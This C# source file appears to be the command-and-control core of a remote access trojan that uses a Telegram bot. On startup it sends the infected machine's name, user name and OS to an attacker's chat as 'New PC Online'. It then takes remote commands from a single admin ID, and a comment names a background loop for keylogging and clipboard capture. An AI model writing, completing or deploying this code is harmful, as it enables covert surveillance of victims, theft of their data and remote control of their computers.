using System;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using Telegram.Bot;
using Telegram.Bot.Types;
using Telegram.Bot.Types.Enums;
using VanguardCore;

namespace FinalBot
{
    public class BotOrchestrator
    {
        private readonly ITelegramBotClient _botClient;
        private readonly string _adminId;
        private readonly CommandHandler _commandHandler;
        private bool _isRunning = true;

        public BotOrchestrator(string token, string adminId)
        {
            _botClient = new TelegramBotClient(token);
            _adminId = adminId;
            _commandHandler = new CommandHandler(_botClient, _adminId);
        }

        public async Task StartAsync()
        {
            Console.WriteLine("[ORCHESTRATOR] Starting services...");
            
            // 1. Initial Report
            await SendStartupReport();

            // 2. Start Polling
            var cts = new CancellationTokenSource();
            _botClient.StartReceiving(
                updateHandler: HandleUpdateAsync,
                pollingErrorHandler: HandlePollingErrorAsync,
                receiverOptions: new Telegram.Bot.Polling.ReceiverOptions { AllowedUpdates = Array.Empty<UpdateType>() },
                cancellationToken: cts.Token
            );

            Console.WriteLine("[ORCHESTRATOR] C2 Polling active.");

            // 3. Main Background Loop (Keylogging, Clipboard, etc.)
            while (_isRunning)
            {
                try 
                {
                    // Placeholder for periodic tasks (like periodic keylog sending)
                    await Task.Delay(1000); 
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[LOOP ERROR] {ex.Message}");
                }
            }
        }

        private async Task HandleUpdateAsync(ITelegramBotClient botClient, Update update, CancellationToken cancellationToken)
        {
            _ = Task.Run(async () =>
            {
                try
                {
                    if (update.Message is { } message)
                    {
                        if (message.From?.Id.ToString() != _adminId) return;
                        Logger.Info($"[C2] Command: {message.Text}");
                        await _commandHandler.HandleCommand(message);
                    }
                    else if (update.CallbackQuery is { } callbackQuery)
                    {
                        if (callbackQuery.From?.Id.ToString() != _adminId) return;
                        Logger.Info($"[C2] Callback: {callbackQuery.Data}");
                        await _commandHandler.HandleCallbackQuery(callbackQuery);
                    }
                }
                catch (Exception ex)
                {
                    Logger.Error("Exception while handling Telegram update", ex);
                }
            }, cancellationToken);
        }

        private Task HandlePollingErrorAsync(ITelegramBotClient botClient, Exception exception, CancellationToken cancellationToken)
        {
            Logger.Error($"[POLLING ERROR]", exception);
            return Task.CompletedTask;
        }

        private async Task SendStartupReport()
        {
            string info = $"🚀 New PC Online\n" +
                          $"🖥️ PC:{Environment.MachineName}\n" +
                          $"👤 User: {Environment.UserName}\n" +
                          $"🌐 OS: {Environment.OSVersion}\n" +
                          $"⏰ Time: {DateTime.Now:yyyy-MM-dd HH:mm:ss}";

            await _botClient.SendTextMessageAsync(
                chatId: _adminId,
                text: info,
                parseMode: ParseMode.Markdown
            );
        }

        public void Stop()
        {
            _isRunning = false;
        }
    }
}
